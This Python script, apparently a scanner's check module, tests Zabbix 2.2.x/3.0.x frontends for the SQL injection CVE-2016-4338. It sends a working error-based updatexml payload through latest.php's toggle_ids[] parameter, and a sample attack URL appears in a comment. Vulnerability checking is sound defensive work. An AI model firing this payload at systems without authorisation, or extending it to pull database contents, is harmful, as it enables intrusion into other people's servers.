#!/usr/bin/python
# -*- coding: utf-8 -*-

## Zabbix 2.2.x / 3.0.x - SQL Injection
# CVE-2016-4338

import requests
import re
import hashlib
import randoms as rand
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def md5(string):
    return hashlib.new('md5', string).hexdigest()


def check(zabbix_homepage_url):
    isvulnerable, data = False, ''

    zabbix_dashbdURI = zabbix_homepage_url + '/dashboard.php'
    zabbix_latestURI = zabbix_homepage_url + '/latest.php'

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept-Encoding': 'identity'
    }

    # get zabbix session id (guest / authenticated)
    sess = requests.Session()
    resp = sess.get(zabbix_dashbdURI, headers=headers)

    if not(resp and resp.status_code == 200 and "?sid=" in resp.text):
        log.info('Failed to get correct zabbix response')
        return isvulnerable, data

    # get zabbix session id - sid
    # - charts.php?sid=2e3a12887a622470
    # - screens.php?sid=2e3a12887a622470
    # - slides.php?sid=2e3a12887a622470
    # - maps.php?sid=2e3a12887a622470
    matches = re.search(r'href="charts\.php\?sid=(.+?)">', resp.text, re.M | re.I)
    if not matches:
        log.info('Failed to get zabbix session id')
        return isvulnerable, data

    sid = matches.group(1)

    # check if sql injection exists
    md5_flag = rand.rand_text_numeric(8)
    md5_hash = md5(md5_flag)

    params = {
        'output': 'ajax',
        'sid': sid,
        'favobj': 'toggle',
        'toggle_open_state': 1,
        'toggle_ids[]': '(select updatexml(1,concat(0x7e,(SELECT md5({md5_flag})),0x7e),1))'.format(md5_flag=md5_flag)
    }

    resp = sess.get(zabbix_latestURI, params=params, headers=headers)
    if resp and resp.status_code == 200 and md5_hash[:-1] in resp.text:
        log.info('CVE-2016-4338 : Zabbix 2.2.x / 3.0.x - SQL Injection - {}'.format(zabbix_homepage_url))
        isvulnerable, data = True, resp.text

    return isvulnerable, data


if __name__ == '__main__':
    import sys
    print(check(sys.argv[1]))


## References
# https://support.zabbix.com/browse/ZBX-11023
# https://www.exploit-db.com/exploits/40237/
# https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/zabbix_latest_sql.py

# http://zabbix:8000/dashboard.php
# http://zabbix:8000/latest.php?output=ajax&sid=5b4e8e94338993da&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(537)),0x7e),1))